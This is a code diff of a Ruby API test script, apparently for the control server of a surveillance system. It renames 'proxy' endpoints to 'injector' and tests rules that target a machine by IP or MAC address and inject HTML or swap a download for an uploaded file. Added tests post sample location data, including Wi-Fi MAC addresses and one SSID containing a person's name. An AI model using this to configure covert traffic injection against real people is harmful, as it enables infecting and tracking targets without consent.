@@ -5,8 +5,8 @@ require 'open-uri'
 require 'pp'
 require 'cgi'
 
-http = Net::HTTP.new('localhost', 443)
-#http = Net::HTTP.new('localhost', 4444)
+#http = Net::HTTP.new('localhost', 443)
+http = Net::HTTP.new('localhost', 4444)
 http.use_ssl = true
 http.verify_mode = OpenSSL::SSL::VERIFY_NONE
 
@@ -264,7 +264,7 @@ if false
 end
 
 # task
-if true
+if false
 
 def REST_task(http, cookie, type, filename, params={})
   
@@ -347,12 +347,12 @@ wap_params = {params: {factory: {_id: factories.first['_id']},
                         }
               }
               
-nia_params = {params: {proxy_id: '4ef0542e963d350d8800115e'}}
+nia_params = {params: {injector_id: '4ef0542e963d350d8800115e'}}
                                    
 #REST_task(http, cookie, 'build', 'android.zip', android_params)
 #REST_task(http, cookie, 'build', 'bb.zip', bb_params)
 #REST_task(http, cookie, 'build', nil, wap_params)
-REST_task(http, cookie, 'proxy', nil, nia_params)
+REST_task(http, cookie, 'injector', nil, nia_params)
 
 =begin
 sleep 3
@@ -390,84 +390,84 @@ if false
   end
 end
 
-# proxy
+# injector
 if false
   
-  proxy_id = 0
+  injector_id = 0
   
-  # proxy.index
-  #res = http.request_get('/proxy', {'Cookie' => cookie})
-  #puts "proxy.index"
+  # injector.index
+  #res = http.request_get('/injector', {'Cookie' => cookie})
+  #puts "injector.index"
   #puts res.body
   #puts
   
-  #proxies = JSON.parse(res.body)
-  #proxies.each do |proxy|
-  #  if proxy['_mid'] == 3
-  #    proxy_id = proxy['_id']
+  #injectors = JSON.parse(res.body)
+  #injectors.each do |injector|
+  #  if injector['_mid'] == 3
+  #    injector_id = injector['_id']
   #  end
   #end
   
-  # proxy.delete
-  #proxies.each do |proxy|
-  #  puts "proxy.delete"
-  #  ret = http.delete("/proxy/#{proxy['_id']}", {'Cookie' => cookie})
+  # injector.delete
+  #injectors.each do |injector|
+  #  puts "injector.delete"
+  #  ret = http.delete("/injector/#{injector['_id']}", {'Cookie' => cookie})
   #  puts ret
   #end
   
-  # proxy.create
-  proxy = {name: 'test'}
-  res = http.request_post('/proxy', proxy.to_json, {'Cookie' => cookie})
-  puts "proxy.create"
+  # injector.create
+  injector = {name: 'test'}
+  res = http.request_post('/injector', injector.to_json, {'Cookie' => cookie})
+  puts "injector.create"
   puts res
   puts
   
-  test_proxy = JSON.parse(res.body)
-  proxy_id = test_proxy['_id']
+  test_injector = JSON.parse(res.body)
+  injector_id = test_injector['_id']
   
-  # proxy.update
-  proxy = {name: 'IPA', address: '1.2.3.4', redirect: '4.3.2.1', desc: 'test injection proxy', port: 4445, poll: true}
-  res = http.request_put("/proxy/#{proxy_id}", proxy.to_json, {'Cookie' => cookie}) 
-  puts "proxy.update "
+  # injector.update
+  injector = {name: 'NIA', address: '1.2.3.4', redirect: '4.3.2.1', desc: 'test injection injector', port: 4445, poll: true}
+  res = http.request_put("/injector/#{injector_id}", injector.to_json, {'Cookie' => cookie}) 
+  puts "injector.update "
   puts res
   puts
   
-  # proxy.show
-  res = http.request_get("/proxy/#{proxy_id}", {'Cookie' => cookie})
-  puts "proxy.show"
+  # injector.show
+  res = http.request_get("/injector/#{injector_id}", {'Cookie' => cookie})
+  puts "injector.show"
   puts res.body
-  #proxy = JSON.parse(res.body)
-  #puts proxy.inspect
+  #injector = JSON.parse(res.body)
+  #puts injector.inspect
   puts
   
-  # proxy.rules
-  puts "proxy.rules"
-  puts proxy['rules'].inspect
+  # injector.rules
+  puts "injector.rules"
+  puts injector['rules'].inspect
   puts
   
-  # proxy.log
-  res = http.request_get("/proxy/logs/#{proxy_id}", {'Cookie' => cookie})
-  puts "proxy.log"
+  # injector.log
+  res = http.request_get("/injector/logs/#{injector_id}", {'Cookie' => cookie})
+  puts "injector.log"
   puts res
   puts
   
-  # proxy.add_rule
-  puts "proxy.add_rule"
+  # injector.add_rule
+  puts "injector.add_rule"
   rule = {rule: {enabled: true, disable_sync: false, ident: 'STATIC-IP', 
           ident_param: '14.11.78.4', probability: 100, resource: 'www.alor.it', 
           action: 'INJECT-HTML', action_param: 'RCS_0000602', target_id: ['4e314a052afb65157900005a']}}
-  res = http.request_post("/proxy/add_rule/#{proxy_id}", rule.to_json, {'Cookie' => cookie})
+  res = http.request_post("/injector/add_rule/#{injector_id}", rule.to_json, {'Cookie' => cookie})
 
   rule = JSON.parse(res.body)
   puts rule
   puts
   
-  # proxy.rules
-  puts "proxy.show"
-  res = http.request_get("/proxy/#{proxy_id}", {'Cookie' => cookie})
+  # injector.rules
+  puts "injector.show"
+  res = http.request_get("/injector/#{injector_id}", {'Cookie' => cookie})
   puts res.body
-  proxy = JSON.parse(res.body)
-  #puts proxy['rules'].inspect
+  injector = JSON.parse(res.body)
+  #puts injector['rules'].inspect
   puts
   
   # upload.create
@@ -478,50 +478,50 @@ if false
   
   upload_id = res.body
   
-  # proxy.update_rule
-  puts "proxy.update_rule"
+  # injector.update_rule
+  puts "injector.update_rule"
   mod = {rule: {_id: rule['_id'], enabled: false, disable_sync: true, ident: 'STATIC-MAC',
           ident_param: '00:11:22:33:44:55', target_id: ['4e314a052afb65157900005a'], action: 'REPLACE', action_param: upload_id}}
-  res = http.request_post("/proxy/update_rule/#{proxy_id}", mod.to_json, {'Cookie' => cookie})
+  res = http.request_post("/injector/update_rule/#{injector_id}", mod.to_json, {'Cookie' => cookie})
   puts res
   puts
   
-  # proxy.rules
-  puts "proxy.show"
-  res = http.request_get("/proxy/#{proxy_id}", {'Cookie' => cookie})
+  # injector.rules
+  puts "injector.show"
+  res = http.request_get("/injector/#{injector_id}", {'Cookie' => cookie})
   puts res.body
-  #proxy = JSON.parse(res.body)
-  #puts proxy['rules'].inspect
+  #injector = JSON.parse(res.body)
+  #puts injector['rules'].inspect
   puts
   
-  # proxy.del_rule
-  puts "proxy.del_rule"
+  # injector.del_rule
+  puts "injector.del_rule"
   request = {rule: {_id: rule['_id']}}
-  res = http.request_post("/proxy/del_rule/#{proxy_id}", request.to_json, {'Cookie' => cookie})
+  res = http.request_post("/injector/del_rule/#{injector_id}", request.to_json, {'Cookie' => cookie})
   puts res
   puts
   
-  # proxy.config
-  puts "proxy.config"
-  res = http.request_get("/proxy/config/#{proxy_id}", {'Cookie' => cookie})
+  # injector.config
+  puts "injector.config"
+  res = http.request_get("/injector/config/#{injector_id}", {'Cookie' => cookie})
   puts res
   puts
 
-  # proxy.delete
-  puts "proxy.delete"
-  ret = http.delete("/proxy/#{proxy_id}", {'Cookie' => cookie})
+  # injector.delete
+  puts "injector.delete"
+  ret = http.delete("/injector/#{injector_id}", {'Cookie' => cookie})
   puts ret
   
   
   
 end
 
-# proxy config
+# injector config
 if false
   
-  # proxy.config
-  res = http.request_get("/proxy/config/4e9ec80d2afb657230001012", {'Cookie' => cookie})
-  puts "proxy.config"
+  # injector.config
+  res = http.request_get("/injector/config/4e9ec80d2afb657230001012", {'Cookie' => cookie})
+  puts "injector.config"
   puts res.body
   
   File.open('config.zip', 'wb+') do |f|
@@ -1096,6 +1096,44 @@ if false
   user = users.first
   puts user
   
+end
+
+#location
+if false
+  # GPS
+  loc = {map: {location: {latitude: 45.12345, longitude: 9.54321}}}
+  puts 'location.gps'
+  res = http.request_post('/location', loc.to_json, {'Cookie' => cookie})
+  puts res.body
+
+  # CELL
+  loc = {map: {cell_towers: [{mobile_country_code: 222, mobile_network_code: 1, location_area_code: 61208, cell_id: 528, signal_strength: -92, timing_advance: 0, age: 0}
+                            ], radio_type: 'gsm'}}
+  puts 'location.cell'
+  res = http.request_post('/location', loc.to_json, {'Cookie' => cookie})
+  puts res.body
+  
+  # WIFI
+  loc = {map: {wifi_towers: [{mac_address: '00:17:C2:F8:9C:60', signal_strength: 55, ssid: 'FASTWEB-1-0017C2F89C60'},
+          {mac_address: '00:25:C9:DF:AB:A7', signal_strength: 41, ssid: 'ht-guest-wifi'},
+          {mac_address: '38:22:9D:F7:84:F4', signal_strength: 77, ssid: 'FASTWEB-1-38229DF784F4'},
+          {mac_address: '00:1F:33:FC:B4:18', signal_strength: 85, ssid: 'NETGEAR'},
+          {mac_address: '00:24:89:01:5E:0B', signal_strength: 48, ssid: 'Vodafone-10369386'},
+          {mac_address: '00:1C:A2:DC:3C:B8', signal_strength: 84, ssid: 'InfostradaWifi'},
+          {mac_address: '00:18:F8:7A:CA:C5', signal_strength: 81, ssid: 'prsp'},
+          {mac_address: '00:25:4B:0A:63:E5', signal_strength: 80, ssid: 'Network di laura spinella'},
+          {mac_address: '00:18:F8:7A:CA:C5', signal_strength: 81, ssid: 'prsp'}
+         ]}
+       }
+  puts 'location.wifi'
+  res = http.request_post('/location', loc.to_json, {'Cookie' => cookie})
+  puts res.body
+
+  # IP
+  loc = {map: {ip_address: {ipv4: '8.8.8.8'}}}
+  puts 'location.ip'
+  res = http.request_post('/location', loc.to_json, {'Cookie' => cookie})
+  puts res.body
 end
 
 # logout
